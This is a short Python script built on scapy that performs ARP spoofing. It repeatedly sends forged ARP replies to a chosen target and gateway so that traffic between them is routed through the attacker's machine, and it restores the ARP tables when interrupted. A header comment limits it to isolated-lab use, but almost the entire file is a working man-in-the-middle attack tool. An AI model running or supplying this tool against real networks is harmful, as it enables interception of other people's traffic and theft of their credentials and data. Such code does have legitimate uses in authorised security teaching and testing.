#!/usr/bin/env python3
"""
ARP Spoofer — educational / isolated-lab use only.
Do NOT run on networks you do not own or have written permission to test.
"""

import argparse
import sys
import time

import scapy.all as scapy


def get_mac(ip: str) -> str:
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = scapy.srp(broadcast / arp, timeout=2, verbose=False)
    if not answered:
        raise RuntimeError(f"No ARP reply from {ip}. Is the host reachable?")
    return answered[0][1].hwsrc


def arp_poison(target_ip: str, spoof_ip: str) -> None:
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip: str, source_ip: str) -> None:
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, verbose=False, count=5)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="ARP spoofer — isolated lab / educational use only."
    )
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    count = 0
    print(f"[*] Poisoning ARP tables: {args.target} <-> {args.gateway}")
    print("[*] Press Ctrl+C to stop and restore.\n")

    try:
        while True:
            arp_poison(args.target, args.gateway)
            arp_poison(args.gateway, args.target)
            count += 2
            print(f"\r[+] Packets sent: {count}", end="", flush=True)
            time.sleep(2.5)
    except KeyboardInterrupt:
        print("\n[*] Stopping — restoring ARP tables...")
        restore(args.target, args.gateway)
        restore(args.gateway, args.target)
        print("[*] Done.")
    except RuntimeError as e:
        print(f"\n[-] {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
